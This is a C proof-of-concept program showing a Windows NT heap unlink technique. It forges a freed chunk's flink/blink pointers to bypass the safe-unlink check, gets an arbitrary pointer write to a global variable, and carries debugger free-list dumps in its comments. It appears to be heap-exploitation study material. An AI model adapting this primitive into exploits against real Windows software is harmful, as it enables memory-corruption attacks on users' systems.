#define _CRT_SECURE_NO_WARNINGS 1
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
using namespace std;

size_t target = 0;
void unlink_and_arbitrary_write_pointer() {
#ifndef _WIN64
	printf("Tested under x64\n");
#endif

	HANDLE hHeap = HeapCreate(HEAP_GROWABLE, 0, 0);

	HeapAlloc(hHeap, 0, 0x28);
	void *p1 = HeapAlloc(hHeap, 0, 0x108);
	void *p2 = HeapAlloc(hHeap, 0, 0x108);
	HeapAlloc(hHeap, 0, 0x28);
	void *p3 = HeapAlloc(hHeap, 0, 0x108);
	HeapAlloc(hHeap, 0, 0x28);

	HeapFree(hHeap, 0, p2);
	printf("p2 is the vulnerable chunk and plan to merge with p1 later\n");
	HeapFree(hHeap, 0, p3);
	/*
	assume that p3 does not exist here
	during unlink, p2 is matched on ListHints and ready to update the bitmap
	assertion is trigger due to decrypting the decrypted _HEAP_ENTRY

	that is the necessary for p3 here
	it is freed and placed in ListHints instead of p2
	then, the assertion will not be triggered
	*/
	printf("p1 %p\n", p1);	// 0x00000200d15b0760
	printf("p2 %p\n", p2);	// 0x00000200d15b0870
	printf("p3 %p\n", p3);	// 0x00000200d15b09b0

	if ((size_t)p1 + 0x110 != (size_t)p2) {
		printf("p1 and p2 will not merge\n");
		return;
	}
	target = (size_t)p2;
	printf("target %p\n", &target);

	printf("overwrite p2 flink/blink\n");
	// satisfy p2->flink->blink == p2->blink->flink == p2
	*((size_t*)(p2)) = (size_t)&target - 8;
	*((size_t*)((size_t)p2 + 8)) = (size_t)&target;
	printf("target = %zx\n", target);
	size_t old_target = target;

	/*
	now, freelist is corrupted
	0:000> dl 00000200d15b0150 f 2
	00000200`d15b0150  00000200`d15b09b0 00000200`d15b0af0
	00000200`d15b09b0  00000200`d15b0870 00000200`d15b0150	// p3
	00000200`d15b0870  00007ff7`84135630 00007ff7`84135638	// p2
	00007ff7`84135630  00000000`00000002 00000200`d15b0870	// target
	*/
	printf("free p1, trigger unlink\n");
	HeapFree(hHeap, 0, p1);
	printf("target = %zx\n", target);
	if (old_target != target) {
		printf("target overwrite done, target = &target\n");
	}
	else {
		printf("target overwrite failed\n");
	}
}

int main() {
	/*
	condition:
	no LFH
	overwrite freed chunk flink/blink
	a dangling pointer points to the freed chunk and its address
	*/
	unlink_and_arbitrary_write_pointer();
	return 1;
}
